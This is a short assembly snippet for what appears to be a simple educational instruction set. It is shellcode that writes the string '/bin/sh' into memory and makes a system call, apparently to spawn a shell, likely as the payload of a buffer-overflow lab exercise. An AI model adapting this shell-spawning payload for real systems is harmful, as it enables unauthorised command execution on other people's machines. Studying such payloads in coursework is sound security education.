
                 gpc  $2, r0           
                 br    12           
                .long 0
                .long 0

   code:
                 shr $2, r0
                 shl $2, r0
                 ld   $0x2f62696e, r1   
                 st   r1 ,(r0)                     
                 ld   $0x2f736800, r1     
                 st   r1, 0x4(r0)         
                 ld   $0x7, r1            
                 sys  $2                  
                 halt                     
